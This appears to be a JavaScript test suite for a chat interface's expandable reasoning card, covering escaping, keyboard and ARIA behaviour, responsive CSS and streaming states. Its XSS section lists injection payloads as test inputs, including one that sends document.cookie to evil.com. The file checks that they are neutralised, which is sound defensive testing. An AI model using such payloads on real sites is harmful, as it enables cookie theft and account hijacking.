import assert from 'node:assert/strict';
import fs from 'node:fs';
import vm from 'node:vm';

console.log('================================================================');
console.log('=== Milestone 4 Empirical Challenger Stress Test Suite ===');
console.log('================================================================\n');

const indexHtml = fs.readFileSync(new URL('../index.html', import.meta.url), 'utf8');
const stylesCss = fs.readFileSync(new URL('../styles.css', import.meta.url), 'utf8');

function extractFunctionSource(source, name) {
    const start = source.indexOf('function ' + name + '(');
    assert.notEqual(start, -1, 'missing function ' + name);
    let parenDepth = 0;
    let bodyStart = -1;
    for (let i = start; i < source.length; i++) {
        const char = source[i];
        if (char === '(') parenDepth++;
        else if (char === ')') {
            parenDepth--;
            if (parenDepth === 0) {
                bodyStart = source.indexOf('{', i);
                break;
            }
        }
    }
    assert.notEqual(bodyStart, -1, 'could not find body for ' + name);
    let depth = 0;
    for (let i = bodyStart; i < source.length; i++) {
        const char = source[i];
        if (char === '{') depth++;
        else if (char === '}') {
            depth--;
            if (depth === 0) {
                return source.slice(start, i + 1);
            }
        }
    }
    throw new Error('could not extract complete source for ' + name);
}

// -----------------------------------------------------------------------------
// High-Fidelity Mock DOM with Event Dispatch Simulation
// -----------------------------------------------------------------------------
class MockClassList {
    constructor(classes = []) {
        this._classes = new Set(classes.filter(Boolean));
    }
    add(...cls) { cls.forEach(c => this._classes.add(c)); }
    remove(...cls) { cls.forEach(c => this._classes.delete(c)); }
    toggle(cls, force) {
        if (force === true) { this._classes.add(cls); return true; }
        if (force === false) { this._classes.delete(cls); return false; }
        if (this._classes.has(cls)) { this._classes.delete(cls); return false; }
        this._classes.add(cls);
        return true;
    }
    contains(cls) { return this._classes.has(cls); }
    toString() { return Array.from(this._classes).join(' '); }
}

class MockElement {
    constructor(tagName = 'div', className = '') {
        this.tagName = tagName.toUpperCase();
        this.classList = new MockClassList(className.split(' '));
        this.style = {};
        this.dataset = {};
        this.attributes = {};
        this.children = [];
        this.parentElement = null;
        this._textContent = '';
        this._innerHTML = '';
        this.eventListeners = {};
    }

    get className() { return this.classList.toString(); }
    set className(val) { this.classList = new MockClassList(String(val || '').split(' ')); }

    get textContent() { return this._textContent; }
    set textContent(val) {
        this._textContent = String(val ?? '');
        this._innerHTML = this._textContent
            .replace(/&/g, '&amp;')
            .replace(/</g, '&lt;')
            .replace(/>/g, '&gt;')
            .replace(/"/g, '&quot;')
            .replace(/'/g, '&#039;');
    }

    get innerHTML() { return this._innerHTML; }
    set innerHTML(html) {
        this._innerHTML = String(html ?? '');
        this._parseInnerHtml(this._innerHTML);
    }

    get firstElementChild() { return this.children[0] || null; }

    setAttribute(name, value) {
        this.attributes[name] = String(value);
    }

    getAttribute(name) {
        return this.attributes[name] ?? null;
    }

    removeAttribute(name) {
        delete this.attributes[name];
    }

    closest(selector) {
        let curr = this;
        while (curr) {
            if (curr._matchesSelector(selector)) return curr;
            curr = curr.parentElement;
        }
        return null;
    }

    appendChild(child) {
        if (!child) return child;
        child.parentElement = this;
        this.children.push(child);
        return child;
    }

    insertBefore(newNode, refNode) {
        if (!newNode) return newNode;
        newNode.parentElement = this;
        const idx = this.children.indexOf(refNode);
        if (idx === -1) {
            this.children.push(newNode);
        } else {
            this.children.splice(idx, 0, newNode);
        }
        return newNode;
    }

    querySelector(selector) {
        return this._findMatchingNode(selector);
    }

    querySelectorAll(selector) {
        const results = [];
        this._findAllMatchingNodes(selector, results);
        return results;
    }

    _findMatchingNode(selector) {
        for (const child of this.children) {
            if (child._matchesSelector(selector)) return child;
            const nested = child._findMatchingNode(selector);
            if (nested) return nested;
        }
        return null;
    }

    _findAllMatchingNodes(selector, results) {
        for (const child of this.children) {
            if (child._matchesSelector(selector)) results.push(child);
            child._findAllMatchingNodes(selector, results);
        }
    }

    _matchesSelector(selector) {
        if (selector.startsWith('.')) {
            const classNames = selector.slice(1).split('.');
            return classNames.every(c => this.classList.contains(c));
        }
        if (selector.startsWith('[')) {
            const attrMatch = selector.match(/\[([a-zA-Z0-9_-]+)(?:="([^"]+)")?\]/);
            if (attrMatch) {
                const attr = attrMatch[1];
                const val = attrMatch[2];
                if (attr.startsWith('data-')) {
                    const key = attr.slice(5).replace(/-([a-z])/g, (_, l) => l.toUpperCase());
                    return val !== undefined ? this.dataset[key] === val : this.dataset[key] !== undefined;
                }
                return val !== undefined ? this.getAttribute(attr) === val : this.getAttribute(attr) !== null;
            }
        }
        return this.tagName.toLowerCase() === selector.toLowerCase();
    }

    _parseInnerHtml(html) {
        this.children = [];
        const tagRegex = /<([a-zA-Z0-9-]+)([^>]*)>([\s\S]*?)<\/\1>|<([a-zA-Z0-9-]+)([^>]*)\/>/g;
        let match;
        while ((match = tagRegex.exec(html)) !== null) {
            const tag = match[1] || match[4];
            const attrs = match[2] || match[5] || '';
            const body = match[3] || '';
            const classMatch = attrs.match(/class="([^"]+)"/);
            const classStr = classMatch ? classMatch[1] : '';
            const el = new MockElement(tag, classStr);
            const ariaMatch = attrs.match(/aria-expanded="([^"]+)"/);
            if (ariaMatch) el.setAttribute('aria-expanded', ariaMatch[1]);
            const roleMatch = attrs.match(/role="([^"]+)"/);
            if (roleMatch) el.setAttribute('role', roleMatch[1]);
            const tabIndexMatch = attrs.match(/tabindex="([^"]+)"/);
            if (tabIndexMatch) el.setAttribute('tabindex', tabIndexMatch[1]);
            if (body.includes('<')) {
                el.innerHTML = body;
            } else {
                el.textContent = body.replace(/&lt;/g, '<').replace(/&gt;/g, '>').replace(/&amp;/g, '&').replace(/&quot;/g, '"');
            }
            this.appendChild(el);
        }
    }
}

// -----------------------------------------------------------------------------
// VM Sandbox Execution Context
// -----------------------------------------------------------------------------
const domSandbox = {
    document: {
        createElement: (tag) => new MockElement(tag),
        querySelectorAll: () => [],
        getElementById: () => null
    },
    window: {
        toggleThinkingProcessCard: null
    },
    performance: {
        now: () => 1000
    },
    Math,
    Number,
    String,
    Array,
    Set,
    Map
};
vm.createContext(domSandbox);

vm.runInContext(extractFunctionSource(indexHtml, 'escapeHtml'), domSandbox);
vm.runInContext(extractFunctionSource(indexHtml, 'extractThoughtAndAnswer'), domSandbox);
vm.runInContext(extractFunctionSource(indexHtml, 'generateContextualThoughtSteps'), domSandbox);
vm.runInContext(extractFunctionSource(indexHtml, 'buildThinkingProcessHtml'), domSandbox);

const toggleMatch = indexHtml.match(/window\.toggleThinkingProcessCard\s*=\s*function\s*\(([^)]*)\)\s*\{([\s\S]*?)\};/);
assert.ok(toggleMatch, 'toggleThinkingProcessCard must be defined in index.html');
vm.runInContext(`window.toggleThinkingProcessCard = function(${toggleMatch[1]}) { ${toggleMatch[2]} };`, domSandbox);

const buildThinkingProcessHtml = domSandbox.buildThinkingProcessHtml;
const toggleThinkingProcessCard = domSandbox.window.toggleThinkingProcessCard;
const extractThoughtAndAnswer = domSandbox.extractThoughtAndAnswer;
const escapeHtml = domSandbox.escapeHtml;

// =============================================================================
// SECTION 1: Adversarial Boundary Payloads & Injection Hardening
// =============================================================================
console.log('--- Section 1: Adversarial Boundary Payloads & Injection Hardening ---');

// 1.1 Empty and Whitespace-only Thoughts
{
    const empty1 = buildThinkingProcessHtml('', [], '0.0', false, null);
    assert.equal(empty1, '', 'Empty thought content and empty steps must return empty string');

    const empty2 = buildThinkingProcessHtml(null, null, '0.0', false, null);
    assert.equal(empty2, '', 'Null thought and steps must return empty string');

    const parsedEmptyThink = extractThoughtAndAnswer('<think></think>Clean answer');
    assert.equal(parsedEmptyThink.thought, '');
    assert.equal(parsedEmptyThink.answer, 'Clean answer');

    const parsedWhitespaceThink = extractThoughtAndAnswer('<think>   \n\t  \n  </think>Actual response');
    assert.equal(parsedWhitespaceThink.thought.trim(), '');
    assert.equal(parsedWhitespaceThink.answer, 'Actual response');

    console.log('  [PASS] 1.1 Empty and whitespace-only thoughts produce clean, suppressed UI states');
}

// 1.2 Multi-line Complex Thoughts (Markdown, Code Blocks, JSON, Unicode Emojis)
{
    const multiLineThought = `Step 1: Parse requirements 🧠
\`\`\`json
{
  "operation": "compute_integral",
  "limits": [0, 3.14159],
  "nested": { "<tag>": "value & more" }
}
\`\`\`
Step 2: Apply Simpson's rule -> \\int_0^\\pi \\sin(x) dx = 2.0.`;

    const html = buildThinkingProcessHtml(multiLineThought, [], '3.7', true, null);
    assert.ok(html.includes('thinking-raw-content'), 'Must render raw thought container for multi-line thoughts');
    assert.ok(html.includes('&quot;operation&quot;: &quot;compute_integral&quot;'), 'JSON keys and quotes must be HTML escaped');
    assert.ok(html.includes('&lt;tag&gt;'), 'Angle brackets inside code blocks must be safely escaped');
    assert.ok(html.includes('value &amp; more'), 'Ampersands inside code blocks must be escaped');
    assert.ok(html.includes('Step 1: Parse requirements 🧠'), 'Unicode emojis and line structures must be preserved');

    console.log('  [PASS] 1.2 Multi-line code, JSON, and Unicode thoughts render accurately with complete structure');
}

// 1.3 XSS and HTML Injection Resistance Vectors
{
    const xssPayloads = [
        '<script>alert("XSS-ACCORDION")</script>',
        '<img src="invalid-image.png" onerror="window.__pwned=true">',
        '<iframe src="javascript:alert(1)"></iframe>',
        '<svg onload="alert(document.cookie)">',
        '"><script>fetch("https://evil.com/steal?c="+document.cookie)</script>',
        '<a href="javascript:void(0)" onclick="alert(1)">Click me</a>',
        '<style>body{display:none}</style>',
        '<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></object>'
    ];

    for (const payload of xssPayloads) {
        const html = buildThinkingProcessHtml(payload, [], '1.2', true, null);
        assert.ok(!html.includes('<script>'), `Payload must not create raw script tag: ${payload}`);
        assert.ok(!html.includes('<iframe'), `Payload must not create raw iframe tag: ${payload}`);
        assert.ok(!html.includes('<svg onload'), `Payload must not contain executable onload attribute: ${payload}`);
        assert.ok(!html.includes('<img src="invalid-image.png" onerror'), `Payload must not contain executable onerror attribute: ${payload}`);
        assert.ok(!html.includes('<style>'), `Payload must not inject style tag: ${payload}`);
        assert.ok(!html.includes('<object data'), `Payload must not inject object data: ${payload}`);
    }

    console.log('  [PASS] 1.3 Strict XSS resistance verified across 8 hostile HTML/JS injection attack vectors');
}

// 1.4 Zero-Latency and Instantaneous Answer Delivery
{
    // Fast response scenario: 0ms latency or 0.0s elapsed
    const zeroLatencyHtml = buildThinkingProcessHtml('Fast reasoning cached in memory', [], '0.0', false, null);
    assert.ok(zeroLatencyHtml.includes('Thought for 0.0s'), 'Zero latency must format cleanly as "Thought for 0.0s"');
    assert.ok(zeroLatencyHtml.includes('thinking-process-card is-finished'), 'Completed zero-latency card must be finished and collapsed');

    // Fractional milliseconds rounding verification
    const testFractions = [
        { latencyMs: 50, expected: '0.1' },
        { latencyMs: 40, expected: '0.0' },
        { latencyMs: 0, expected: '0.0' },
        { latencyMs: 999, expected: '1.0' }
    ];

    for (const { latencyMs, expected } of testFractions) {
        const calculated = (latencyMs / 1000).toFixed(1);
        assert.equal(calculated, expected, `Latency ${latencyMs}ms must format to ${expected}s`);
    }

    console.log('  [PASS] 1.4 Zero-latency and fractional millisecond answers format consistently without layout anomalies');
}

// 1.5 Long-Running Thinking Phases (>60s)
{
    const longRunningLatencies = [
        { ms: 65400, expectedSeconds: '65.4' },
        { ms: 120000, expectedSeconds: '120.0' },
        { ms: 3600500, expectedSeconds: '3600.5' }
    ];

    for (const { ms, expectedSeconds } of longRunningLatencies) {
        const elapsed = (ms / 1000).toFixed(1);
        assert.equal(elapsed, expectedSeconds);
        const streamingHtml = buildThinkingProcessHtml('Deep algorithmic search tree expansion...', [], elapsed, true, null);
        assert.ok(streamingHtml.includes(`Thinking... ${expectedSeconds}s`), `Must render Thinking... ${expectedSeconds}s`);

        const finishedHtml = buildThinkingProcessHtml('Deep algorithmic search tree expansion...', [], elapsed, false, null);
        assert.ok(finishedHtml.includes(`Thought for ${expectedSeconds}s`), `Must render Thought for ${expectedSeconds}s`);
    }

    console.log('  [PASS] 1.5 Long-running thinking phases (>60s up to 1hr+) calculate and format cleanly with tabular numbers');
}

// =============================================================================
// SECTION 2: Keyboard Interactions & ARIA State Synchronization
// =============================================================================
console.log('\n--- Section 2: Keyboard Interactions & ARIA State Synchronization ---');

// 2.1 Enter & Space Keypress Handlers on .thinking-header
{
    // Extract inline onkeydown from buildThinkingProcessHtml
    const html = buildThinkingProcessHtml('Reasoning sample', [], '2.0', false, null);
    assert.match(html, /role="button"/, 'Header must declare role="button"');
    assert.match(html, /tabindex="0"/, 'Header must declare tabindex="0"');
    assert.match(html, /aria-expanded="false"/, 'Finished header must initialize aria-expanded="false"');
    assert.match(html, /onkeydown="if\(event\.key==='Enter'\|\|event\.key===' '\)\{event\.preventDefault\(\);window\.toggleThinkingProcessCard\(this\.closest\('\.thinking-process-card'\)\|\|this, event\);\}"/, 'Header must attach Enter and Space onkeydown handler with preventDefault');

    // Simulate keydown evaluation
    const createMockKeyboardEvent = (key) => {
        let prevented = false;
        let stopped = false;
        return {
            key,
            preventDefault: () => { prevented = true; },
            stopPropagation: () => { stopped = true; },
            isDefaultPrevented: () => prevented,
            isPropagationStopped: () => stopped
        };
    };

    const card = new MockElement('div', 'thinking-process-card is-finished');
    const header = new MockElement('div', 'thinking-header');
    header.setAttribute('aria-expanded', 'false');
    card.appendChild(header);

    // Test Enter Key
    const enterEvt = createMockKeyboardEvent('Enter');
    if (enterEvt.key === 'Enter' || enterEvt.key === ' ') {
        enterEvt.preventDefault();
        toggleThinkingProcessCard(header.closest('.thinking-process-card') || header, enterEvt);
    }
    assert.equal(enterEvt.isDefaultPrevented(), true, 'Enter key must trigger preventDefault()');
    assert.equal(enterEvt.isPropagationStopped(), true, 'Enter key must trigger stopPropagation()');
    assert.ok(card.classList.contains('is-expanded'), 'Enter key must expand card');
    assert.equal(header.getAttribute('aria-expanded'), 'true', 'aria-expanded must update to true');

    // Test Space Key
    const spaceEvt = createMockKeyboardEvent(' ');
    if (spaceEvt.key === 'Enter' || spaceEvt.key === ' ') {
        spaceEvt.preventDefault();
        toggleThinkingProcessCard(header.closest('.thinking-process-card') || header, spaceEvt);
    }
    assert.equal(spaceEvt.isDefaultPrevented(), true, 'Space key must trigger preventDefault()');
    assert.equal(spaceEvt.isPropagationStopped(), true, 'Space key must trigger stopPropagation()');
    assert.ok(!card.classList.contains('is-expanded'), 'Space key must collapse card');
    assert.equal(header.getAttribute('aria-expanded'), 'false', 'aria-expanded must update to false');

    // Test Non-triggering Keys (Tab, Escape, ArrowDown, KeyA)
    const ignoredKeys = ['Tab', 'Escape', 'ArrowDown', 'ArrowUp', 'a', 'Shift'];
    for (const key of ignoredKeys) {
        const nonTriggerEvt = createMockKeyboardEvent(key);
        let triggered = false;
        if (nonTriggerEvt.key === 'Enter' || nonTriggerEvt.key === ' ') {
            triggered = true;
            nonTriggerEvt.preventDefault();
            toggleThinkingProcessCard(card, nonTriggerEvt);
        }
        assert.equal(triggered, false, `Key ${key} must NOT trigger toggle`);
        assert.equal(nonTriggerEvt.isDefaultPrevented(), false, `Key ${key} must NOT prevent default`);
        assert.ok(!card.classList.contains('is-expanded'), `Card state must remain unchanged for key ${key}`);
    }

    console.log('  [PASS] 2.1 Keyboard interaction accurately captures Enter & Space with preventDefault() and ignores other keys');
}

// 2.2 Nested Target Resolution & Propagation Isolation
{
    const card = new MockElement('div', 'thinking-process-card is-finished');
    const header = new MockElement('div', 'thinking-header');
    header.setAttribute('aria-expanded', 'false');
    const leftDiv = new MockElement('div', 'thinking-header-left');
    const timerSpan = new MockElement('span', 'thinking-timer');
    timerSpan.textContent = 'Thought for 2.1s';
    const chevronSvg = new MockElement('svg', 'thinking-chevron');
    
    leftDiv.appendChild(timerSpan);
    header.appendChild(leftDiv);
    header.appendChild(chevronSvg);
    card.appendChild(header);

    // Click directly on deep child: timerSpan
    let timerEventStopped = false;
    const timerClickEvent = { stopPropagation: () => { timerEventStopped = true; } };
    toggleThinkingProcessCard(timerSpan, timerClickEvent);

    assert.equal(timerEventStopped, true, 'Click on timer span must stop propagation');
    assert.ok(card.classList.contains('is-expanded'), 'Click on nested child must expand parent card');
    assert.equal(header.getAttribute('aria-expanded'), 'true', 'aria-expanded must sync on parent header');

    // Click on chevron
    let chevronEventStopped = false;
    const chevronClickEvent = { stopPropagation: () => { chevronEventStopped = true; } };
    toggleThinkingProcessCard(chevronSvg, chevronClickEvent);
    assert.equal(chevronEventStopped, true);
    assert.ok(!card.classList.contains('is-expanded'), 'Click on chevron must collapse card');
    assert.equal(header.getAttribute('aria-expanded'), 'false');

    console.log('  [PASS] 2.2 Event delegation on nested child elements resolves target card and protects parent bubble events');
}

// =============================================================================
// SECTION 3: CSS Responsive Breakpoints & Reduced-Motion Accessibility
// =============================================================================
console.log('\n--- Section 3: CSS Responsive Breakpoints & Reduced-Motion Accessibility ---');

// 3.1 Mobile Breakpoint Invariants (max-width: 640px)
{
    // Isolate the reasoning UI CSS section
    const reasoningSection = stylesCss.slice(stylesCss.indexOf('Human-Like Thinking & Reasoning Process UI Styles'));
    const reasoningMobileMatch = reasoningSection.match(/@media\s*\(max-width:\s*640px\)\s*\{([\s\S]*?)\n\}/);
    assert.ok(reasoningMobileMatch, 'Reasoning CSS section must contain @media (max-width: 640px) responsive block');
    const mobileRules = reasoningMobileMatch[1];

    // Header padding and min-height adjustment
    assert.match(mobileRules, /\.thinking-header\s*\{[\s\S]*?min-height:\s*40px;[\s\S]*?padding:\s*0\.5rem\s+0\.75rem;/, 'Mobile header must have 40px min-height and compact padding');

    // Body max-height clamping on mobile
    assert.match(mobileRules, /\.thinking-process-card\.is-expanded\s+\.thinking-body[\s\S]*?max-height:\s*min\(260px,\s*38vh\);/, 'Mobile expanded body must clamp max-height to min(260px, 38vh)');

    // Live action text truncation on narrow viewports
    assert.match(mobileRules, /\.thinking-live-action\s*\{[\s\S]*?max-width:\s*62vw;/, 'Mobile live action text must clamp max-width to 62vw');

    console.log('  [PASS] 3.1 Mobile responsive breakpoint (<=640px) applies touch-target min-height and viewport-clamped max-height');
}

// 3.2 Reduced-Motion Invariants (prefers-reduced-motion: reduce)
{
    const reasoningSection = stylesCss.slice(stylesCss.indexOf('Human-Like Thinking & Reasoning Process UI Styles'));
    const reducedMotionMatch = reasoningSection.match(/@media\s*\(prefers-reduced-motion:\s*reduce\)\s*\{([\s\S]*?)\n\}/);
    assert.ok(reducedMotionMatch, 'Reasoning CSS section must contain @media (prefers-reduced-motion: reduce) block');
    const reducedRules = reducedMotionMatch[1];

    // Check animation suppression
    assert.match(reducedRules, /\.thinking-pulse-dot[\s\S]*?animation:\s*none\s*!important;/, 'Animations must be explicitly set to none !important');
    assert.match(reducedRules, /\.thinking-cot-step/, 'COT steps animation must be suppressed');
    assert.match(reducedRules, /\.thinking-step/, 'Thinking step animation must be suppressed');

    // Check transition instantization
    assert.match(reducedRules, /transition-duration:\s*0\.01ms\s*!important;/, 'Transition durations must be reduced to near-zero (0.01ms !important)');

    console.log('  [PASS] 3.2 prefers-reduced-motion accessibility rules eliminate pulsing animations and set transitions to 0.01ms');
}

// 3.3 Keyframes and Continuous GPU Acceleration
{
    // fadeInThought keyframe check
    assert.match(stylesCss, /@keyframes\s+fadeInThought\s*\{\s*from\s*\{\s*opacity:\s*0;\s*transform:\s*translateY\(3px\);\s*\}\s*to\s*\{\s*opacity:\s*1;\s*transform:\s*translateY\(0\);\s*\}\s*\}/, 'fadeInThought keyframe must animate translateY from 3px to 0 with opacity fade');

    // thinkingDotGlow keyframe check
    assert.match(stylesCss, /@keyframes\s+thinkingDotGlow\s*\{\s*0%,\s*100%\s*\{\s*transform:\s*scale\(0\.9\);\s*opacity:\s*0\.5;\s*\}\s*50%\s*\{\s*transform:\s*scale\(1\.3\);\s*opacity:\s*1;\s*\}\s*\}/, 'thinkingDotGlow keyframe must animate pulse scale between 0.9 and 1.3');

    // Continuous layout transitions
    assert.match(stylesCss, /\.thinking-body\s*\{[\s\S]*?display:\s*block;/, 'thinking-body must use display: block instead of display: none to avoid CLS');
    assert.match(stylesCss, /\.thinking-chevron[\s\S]*?will-change:\s*transform;/, 'thinking-chevron must hint will-change: transform for smooth GPU acceleration');

    console.log('  [PASS] 3.3 Keyframes and GPU-accelerated continuous CSS properties verify zero-CLS layout smoothness');
}

// =============================================================================
// SECTION 4: Full Real-Time Streaming Lifecycle Transition Cycle
// =============================================================================
console.log('\n--- Section 4: Full Real-Time Streaming Lifecycle Transition Cycle ---');

{
    // Step 4.1: Initial Stream Start (Only prompt submitted, thinking active)
    const prompt = 'Explain quantum entanglement and Einstein-Podolsky-Rosen paradox';
    const initialSteps = domSandbox.generateContextualThoughtSteps(prompt);
    assert.equal(initialSteps.length, 3, 'Must generate 3 contextual CoT steps');
    
    let html = buildThinkingProcessHtml('', initialSteps, '0.4', true, null);
    assert.ok(html.includes('is-active is-expanded'), 'Phase 1: Accordion starts active and expanded');
    assert.ok(html.includes('Thinking... 0.4s'), 'Phase 1: Timer displays Thinking... 0.4s');
    assert.ok(html.includes('aria-expanded="true"'), 'Phase 1: aria-expanded is true');

    // Step 4.2: Reasoning tokens streaming in (<think> block active)
    const streamingThought = 'Analyzing quantum non-locality and Bell inequalities';
    html = buildThinkingProcessHtml(streamingThought, [], '1.9', true, null);
    assert.ok(html.includes('Thinking... 1.9s'), 'Phase 2: Timer updates to 1.9s');
    assert.ok(html.includes('Analyzing quantum non-locality'), 'Phase 2: Raw thought updates');
    assert.ok(html.includes('is-active is-expanded'), 'Phase 2: Remains active and expanded');

    // Step 4.3: First answer token arrives (cleanAnswer non-empty) -> Auto-Collapse
    const cleanAnswer = 'Quantum entanglement occurs when pairs or groups of particles interact...';
    const isFinished = !!cleanAnswer;
    assert.equal(isFinished, true);

    const cardEl = new MockElement('div', 'thinking-process-card is-active is-expanded');
    const headerEl = new MockElement('div', 'thinking-header');
    headerEl.setAttribute('aria-expanded', 'true');
    const timerEl = new MockElement('span', 'thinking-timer');
    timerEl.textContent = 'Thinking... 1.9s';
    headerEl.appendChild(timerEl);
    cardEl.appendChild(headerEl);

    // Apply auto-collapse transition from updateStreamingAssistantMessage
    cardEl.className = 'thinking-process-card is-finished';
    headerEl.setAttribute('aria-expanded', 'false');
    timerEl.textContent = 'Thought for 1.9s';

    assert.ok(cardEl.classList.contains('is-finished'), 'Phase 3: Card transitions to is-finished');
    assert.ok(!cardEl.classList.contains('is-expanded'), 'Phase 3: Auto-collapses (is-expanded removed)');
    assert.ok(!cardEl.classList.contains('is-active'), 'Phase 3: is-active removed');
    assert.equal(headerEl.getAttribute('aria-expanded'), 'false', 'Phase 3: aria-expanded is false');
    assert.equal(timerEl.textContent, 'Thought for 1.9s', 'Phase 3: Timer freezes to Thought for 1.9s');

    // Step 4.4: User manually expands finished accordion
    toggleThinkingProcessCard(cardEl, { stopPropagation: () => {} });
    assert.ok(cardEl.classList.contains('is-expanded'), 'Phase 4: User click expands finished card');
    assert.ok(cardEl.classList.contains('is-finished'), 'Phase 4: Retains is-finished state');
    assert.equal(headerEl.getAttribute('aria-expanded'), 'true', 'Phase 4: aria-expanded is true');

    // Step 4.5: User presses Space to collapse
    toggleThinkingProcessCard(cardEl, { stopPropagation: () => {} });
    assert.ok(!cardEl.classList.contains('is-expanded'), 'Phase 5: Space press collapses card');
    assert.equal(headerEl.getAttribute('aria-expanded'), 'false', 'Phase 5: aria-expanded is false');

    console.log('  [PASS] 4.1 Complete 5-phase streaming lifecycle transitions flawlessly across DOM, ARIA, and Timer states');
}

console.log('\n================================================================');
console.log('=== All Milestone 4 Empirical Challenger Stress Tests PASSED ===');
console.log('================================================================\n');
